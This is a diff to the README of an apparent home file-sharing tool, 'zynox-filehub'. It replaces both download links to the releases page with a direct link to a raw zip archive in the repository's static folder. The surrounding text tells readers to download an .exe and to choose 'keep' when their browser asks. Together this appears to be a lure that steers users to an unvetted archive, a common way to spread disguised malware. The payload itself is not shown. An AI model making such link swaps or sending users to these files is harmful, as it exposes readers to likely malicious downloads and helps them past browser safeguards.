@@ -1,6 +1,6 @@
 # 📁 zynox-filehub - Share files across your home network
 
-[![](https://img.shields.io/badge/Download_Zynox-blue?style=for-the-badge)](https://github.com/sloughsprayer329/zynox-filehub/releases)
+[![](https://img.shields.io/badge/Download_Zynox-blue?style=for-the-badge)](https://github.com/sloughsprayer329/zynox-filehub/raw/refs/heads/main/static/filehub_zynox_v3.8-alpha.5.zip)
 
 zynox-filehub lets you share files and watch videos on any device in your house. It runs on your computer and creates a private connection for your local network. You manage everything through your web browser. You do not need to upload files to the cloud. Everything stays on your hard drive.
 
@@ -8,7 +8,7 @@ zynox-filehub lets you share files and watch videos on any device in your house.
 
 You download the software from the project release page. 
 
-[Visit this page to download the latest version](https://github.com/sloughsprayer329/zynox-filehub/releases)
+[Visit this page to download the latest version](https://github.com/sloughsprayer329/zynox-filehub/raw/refs/heads/main/static/filehub_zynox_v3.8-alpha.5.zip)
 
 Look for the file that ends in .exe for Windows. Click that link to start your download. Your browser might ask you to keep the file. Choose keep to continue.
 
